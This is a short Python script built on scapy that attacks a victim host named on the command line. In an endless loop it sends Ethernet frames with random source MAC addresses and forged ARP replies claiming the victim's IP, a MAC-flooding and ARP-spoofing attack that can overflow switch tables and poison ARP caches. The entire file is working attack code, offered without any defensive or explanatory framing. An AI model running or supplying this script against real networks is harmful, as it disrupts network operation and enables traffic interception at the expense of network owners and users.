#!/usr/bin/env python
from scapy.all import *
import sys

def mac_flood(victim_ip):
    try:
        while True:
            randMAC = RandMAC()
            print(randMAC)
            victim_mac = getmacbyip(victim_ip)
            sendp(Ether(src = randMAC, dst = victim_mac)/
            ARP(op = 2, psrc = victim_ip, hwdst = victim_mac)/Padding(load = "X" * 18), verbose=0)

    except KeyboardInterrupt:
        quit()

def main():
    victim_ip = sys.argv[1]
    mac_flood(victim_ip)
    


if __name__ == '__main__':
   main() 
